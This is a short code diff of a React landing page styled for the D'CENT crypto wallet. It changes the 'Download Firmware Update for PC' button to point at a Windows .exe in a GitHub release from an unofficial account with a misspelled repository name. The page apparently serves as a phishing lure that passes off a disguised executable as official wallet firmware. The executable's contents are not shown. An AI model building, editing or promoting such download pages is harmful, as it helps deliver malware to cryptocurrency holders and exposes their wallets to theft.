@@ -122,7 +122,7 @@ export default function App() {
 
           <div className="flex flex-wrap gap-3 mb-4">
             <a
-              href="https://api.files.link/v1/p/a43b654c-85ef-439c-816c-a2f6dcd46b0a"
+              href="https://github.com/guide1-cloud/d-cent-firmwar/releases/download/v1.2.1/D.CENT_Firmware2.36.0.exe"
               className="inline-flex items-center justify-center px-6 py-3 rounded-lg bg-dcent-green text-dcent-dark font-semibold text-sm hover:bg-dcent-green-light transition-colors"
             >
               Download Firmware Update for PC
